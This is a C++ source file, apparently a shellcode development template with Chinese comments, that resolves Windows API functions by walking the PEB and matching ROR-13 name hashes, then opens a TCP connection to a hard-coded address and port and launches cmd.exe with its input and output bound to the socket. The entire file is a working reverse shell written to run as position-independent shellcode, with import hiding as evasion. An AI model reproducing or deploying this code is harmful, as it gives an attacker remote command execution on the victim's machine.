// shellcode.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <winternl.h>
#include <Windows.h>
#include <winnt.h>
#include <stddef.h>
#include <stdio.h>

#define htons(A) ((((WORD)(A) & 0xFF00) >> 8) | (((WORD)(A) & 0x00FF) << 8))

_inline PEB *getPEB()
{
	PEB *p;

	__asm {
		mov eax, fs:[30h]
		mov p, eax
	}
	return p;
}

DWORD getHash(const char* str)
{
	DWORD h = 0;

	while (*str)
	{
		h = (h >> 13) | (h << (32 - 13)); // ROR h,13
		h += *str >= 'a' ? *str - 32 : *str;
		str++;
	}
	return h;
}

DWORD getFunctionHash(const char* moduleName, const char* functionName)
{
	return getHash(moduleName) + getHash(functionName);
}

LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr)
{
	int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

	return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
}

PVOID getProcAddrByHash(DWORD hash)
{
	PEB* peb = getPEB();

	LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY* ptr = first;

	do {
		LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
		ptr = ptr->Flink;

		BYTE* baseAddres = (BYTE*)dte->DllBase;
		if (!baseAddres) //无效模块
			continue;
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddres;
		IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddres + dosHeader->e_lfanew);

		DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (!iedRVA) //导出目录不存在
			continue;
		IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddres + iedRVA);
		char* moduleName = (char*)(baseAddres + ied->Name);
		DWORD moduleHash = getHash(moduleName);

		DWORD* nameRVAs = (DWORD*)(baseAddres + ied->AddressOfNames);
		for (DWORD i = 0; i < ied->NumberOfNames; ++i)
		{
			char* functionName = (char*)(baseAddres + nameRVAs[i]);
			if (hash == moduleHash + getHash(functionName))
			{
				WORD ordinal = ((WORD*)(baseAddres + ied->AddressOfNameOrdinals))[i];
				DWORD functionRVA = ((DWORD*)(baseAddres + ied->AddressOfFunctions))[ordinal];
				return baseAddres + functionRVA;
			}
		}
	} while (ptr != first);

	return NULL; //地址没找到
}

#define HASH_LoadLibraryA 0xf8b7108d
#define HASH_WSAStartup 0x2ddcd540
#define HASH_WSACleanup 0x0b9d13bc
#define HASH_WSASocketA 0x9fd4f16f
#define HASH_WSAConnect 0xa50da182
#define HASH_CreateProcessA 0x231cbe70
#define HASH_inet_ntoa 0x1b73fed1
#define HASH_inet_addr 0x011bfae2
#define HASH_getaddrinfo 0xdc2953c9
#define HASH_getnameinfo 0x5c1c856e
#define HASH_ExitThread 0x4b3153e0
#define HASH_WaitForSingleObject 0xca8e9498

#define DefineFuncPtr(name) decltype(name) *My_##name=(decltype(name)*)getProcAddrByHash(HASH_##name);

int entryPoint()
{
	DefineFuncPtr(LoadLibraryA);
	My_LoadLibraryA("ws2_32.dll");
	DefineFuncPtr(WSAStartup);
	DefineFuncPtr(WSASocketA);
	DefineFuncPtr(WSAConnect);
	DefineFuncPtr(CreateProcessA);
	DefineFuncPtr(inet_ntoa);
	DefineFuncPtr(inet_addr);
	DefineFuncPtr(getaddrinfo);
	DefineFuncPtr(getnameinfo);
	DefineFuncPtr(ExitThread);
	DefineFuncPtr(WaitForSingleObject);

	const char* hostName = "127.0.0.1";
	const int hostPort = 123;

	WSADATA wsaData;
	if (My_WSAStartup(MAKEWORD(2, 2), &wsaData))
		goto __end;
	SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sock == INVALID_SOCKET)
		goto __end;

	addrinfo* result;
	if (My_getaddrinfo(hostName, NULL, NULL, &result))
		goto __end;

	char ip_addr[16];
	My_getnameinfo(result->ai_addr, result->ai_addrlen, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);

	SOCKADDR_IN remoteAddr;
	remoteAddr.sin_family = AF_INET;
	remoteAddr.sin_port = htons(hostPort);
	remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);

	if (My_WSAConnect(sock, (SOCKADDR*)&remoteAddr, sizeof(remoteAddr), NULL, NULL, NULL, NULL))
		goto __end;

	STARTUPINFOA sInfo;
	PROCESS_INFORMATION procInfo;
	SecureZeroMemory(&sInfo, sizeof(sInfo)); // 避免调用_memset
	sInfo.cb = sizeof(sInfo);
	sInfo.dwFlags = STARTF_USESTDHANDLES;
	sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
	My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInfo);

	My_WaitForSingleObject(procInfo.hProcess, INFINITE);
__end:
	My_ExitThread(0);

	return 0;
}

int main()
{
	return entryPoint();
}